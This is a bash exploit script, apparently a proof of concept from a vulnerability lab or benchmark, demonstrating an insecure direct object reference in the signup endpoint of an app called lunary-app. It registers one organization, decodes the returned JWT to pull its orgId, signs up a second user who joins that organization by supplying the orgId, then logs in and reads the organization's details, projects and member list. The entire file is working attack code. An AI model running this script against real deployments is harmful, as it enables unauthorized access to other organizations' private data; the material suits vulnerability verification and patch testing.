#!/bin/bash

# Exploit script to demonstrate IDOR vulnerability in signup process

# Create a new organization
echo "Creating new organization..."
response=$(curl -s -X POST http://lunary-app:3333/auth/signup -H "Content-Type: application/json" -d '{"email":"user_c@exploit.com", "password":"secret_user_c_password", "name":"User C", "orgName":"Org C", "projectName":"Project C", "employeeCount":"1-10", "signupMethod":"signup"}')
echo "Response: $response"

token=$(echo $response | jq -r '.token')
payload=$(echo $token | cut -d. -f2 | base64 -d 2>/dev/null)
org_id=$(echo $payload | jq -r '.orgId')
echo "Extracted org_id: $org_id"

# Attempt to join the organization without authorization
echo "Attempting to join organization..."
exploit_response=$(curl -s -X POST http://lunary-app:3333/auth/signup -H "Content-Type: application/json" -d "{\"email\":\"user_d@exploit.com\", \"password\":\"secret_user_d_password\", \"name\":\"User D\", \"orgId\":\"$org_id\", \"signupMethod\":\"join\"}")
echo "Exploit response: $exploit_response"

echo "Logging in as User D..."
login_response=$(curl -s -X POST http://lunary-app:3333/auth/login -H "Content-Type: application/json" -d '{"email":"user_d@exploit.com", "password":"secret_user_d_password"}')
user_d_token=$(echo $login_response | jq -r '.token')
echo "User D token: $user_d_token"
# Get organization details
echo "Attempting to get organization details..."
org_details=$(curl -s -X GET http://lunary-app:3333/v1/orgs/$org_id -H "Authorization: Bearer $user_d_token")
echo "Organization details: $org_details"

# List organization projects
echo "Attempting to list organization projects..."
org_projects=$(curl -s -X GET http://lunary-app:3333/v1/projects -H "Authorization: Bearer $user_d_token")
echo "Organization projects: $org_projects"

# List organization members
echo "Attempting to list organization members..."
org_members=$(curl -s -X GET http://lunary-app:3333/v1/orgs/$org_id/members -H "Authorization: Bearer $user_d_token")
echo "Organization members: $org_members"

if echo $exploit_response | grep -q "token"; then
    echo "Exploit successful. IDOR vulnerability confirmed."
    exit 0
else
    echo "Exploit failed. IDOR vulnerability may have been patched."
    exit 1
fi